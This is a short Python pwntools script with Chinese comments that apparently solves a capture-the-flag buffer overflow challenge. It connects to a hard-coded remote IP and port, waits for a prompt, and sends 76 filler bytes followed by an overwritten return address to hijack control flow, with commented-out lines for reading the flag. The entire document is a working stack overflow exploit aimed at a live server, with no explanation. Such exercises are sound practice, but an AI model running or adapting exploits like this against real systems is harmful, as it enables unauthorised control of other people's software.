import pwn

# 连接远程服务器
r = pwn.remote("124.16.75.117", 51003)

# 定义栈溢出
payload = b"A" * 76 + pwn.p32(0x80491F6)

# 发送数据并接收回显
r.recvuntil(b"Give me a string and lets see what happens: ")
r.sendline(payload)
# # 获取flag
# r.recvuntil(b"Woah, were jumping to 0x")
# flag = int(r.recvline().strip().split(b"!")[0], 16)
# print(hex(flag))
# # 0x80491f6
rst = r.recvall()
print(rst)
